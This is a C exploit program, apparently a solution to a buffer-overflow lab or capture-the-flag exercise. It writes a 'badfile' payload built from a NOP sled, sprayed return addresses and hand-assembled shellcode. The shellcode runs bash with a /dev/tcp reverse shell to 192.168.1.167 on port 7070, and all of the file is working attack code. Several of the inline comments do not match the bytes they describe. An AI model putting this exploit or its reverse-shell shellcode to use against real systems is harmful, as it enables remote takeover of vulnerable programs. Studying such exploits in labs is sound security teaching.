#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define SIZE 20000

char shellcode[]=
	// Push '/bin////bash' into stack
	"\x31\xc0"       			// xorl %eax,%eax
	"\x50"              			// pushl %eax
	"\x68""bash"  				// pushl "bash"
	"\x68""////"                		// pushl "////"
	"\x68""/bin"     			// pushl "/bin"
	"\x89\xe3"       			// movl %esp, %ebx

	// Push '-ccc' into stack
	"\x31\xc0"       			// xorl %eax,%eax
	"\x50"                      		// pushl %eax
	"\x68""-ccc"    			// pushl "-ccc"
	"\x89\xe0"       			// movl %esp, %eax

	// Push command for reverse shell into stack
	"\x31\xd2"				// xorl %edx,%edx
	"\x52"					// pushl %edx
	"\x68""2>&1"				// pushl "2>&1"
	"\x68""    "				// pushl "    "
	"\x68""0<&1"				// pushl "0<&1"
	"\x68""    "				// pushl "    "
	"\x68""    "				// pushl "    "
	"\x68""070 "				// pushl "070 "  070
	"\x68""67/7"				// pushl "070 "  070
	"\x68"".1.1"				// pushl "70/7"  70/7
	"\x68"".168"				// pushl "0.2."  0.2.
	"\x68""/192"				// pushl "/10."  10.
	"\x68""/tcp"				// pushl "/tcp"
	"\x68""/dev"				// pushl "/dev"
	"\x68"" >  "				// pushl " >  "
	"\x68"" -i "				// pushl " -i "
	"\x68""bash"				// pushl "bash"
	"\x68""////"				// pushl "////"
	"\x68""/bin"				// pushl "/bin"
	"\x89\xe2"				// movl %esp,%edx

	// Construct the argv[] array
	"\x31\xc9"				// xorl %ecx,%ecx
	"\x51"					// pushl %ecx
	"\x52"					// pushl %edx
	"\x50"					// pushl %eax
	"\x53"					// pushl %ebx
	"\x89\xe1"				// movl %esp,%ecx

	// Set edx to 0
	"\x31\xd2"				// xorl %edx,%edx

	// Invoke the system call
	"\x31\xc0"				// xorl %eax,%eax
	"\xb0\x0b"                  		// movb $0x0b,%al
	"\xcd\x80"                  		// int $0x80
	;

void main(int argc, char **argv)
{
    	char buffer[SIZE];
    	FILE *badfile;

        if(argc <4) {printf("Usage: ./exploit_ctf s_addr addr_range maxDist\n");exit(0);}
        unsigned long addr = strtoul(argv[1],NULL,10);
	int addrRange = atoi(argv[2]);
	int maxDist = atoi(argv[3]);

        printf("oaddr:%s, addr:%04x, distance:%d\n",argv[1],addr, maxDist);
    	
	/* Initialize buffer with 0x90 (NOP instruction) */
    	memset(&buffer, 0x90, SIZE);

    	/* You need to fill the buffer with appropriate contents here */    	   
        //printf("shellcode length:%d\n",strlen(shellcode));
        unsigned long ret_addr = addr + addrRange + maxDist + 0x40;
        for(int i=0; i<addrRange+maxDist+0x40; i+=4 ){
         *((long *)(buffer+i)) = ret_addr;    
        }  
        // Place the shellcode towards the end of buffer
   	memcpy(buffer + sizeof(buffer) - sizeof(shellcode), shellcode, sizeof(shellcode));

    	/* Save the contents to the file "badfile" */
    	badfile = fopen("./badfile", "w");
    	fwrite(buffer, 1, SIZE, badfile);
    	fclose(badfile);
}
